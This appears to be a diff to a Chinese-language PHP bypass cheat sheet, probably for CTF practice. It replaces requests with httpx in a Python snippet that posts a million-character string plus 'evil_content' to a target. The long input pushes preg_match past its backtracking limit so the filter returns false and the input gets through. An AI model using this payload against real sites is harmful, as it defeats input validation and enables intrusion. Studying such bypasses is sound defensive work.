@@ -110,12 +110,12 @@ if (intval($_GET['num']) === 0) { ... }
 ### PCRE 回溯限制绕过
 
 ```python
-import requests
+import httpx
 url = "http://target/index.php"
 # 构造超长字符串让 preg_match 回溯超限返回 false
 payload = "a" * 1000000 + "evil_content"
 data = {"input": payload}
-r = requests.post(url, data=data)
+r = httpx.post(url, data=data)
 print(r.text)
 ```
 
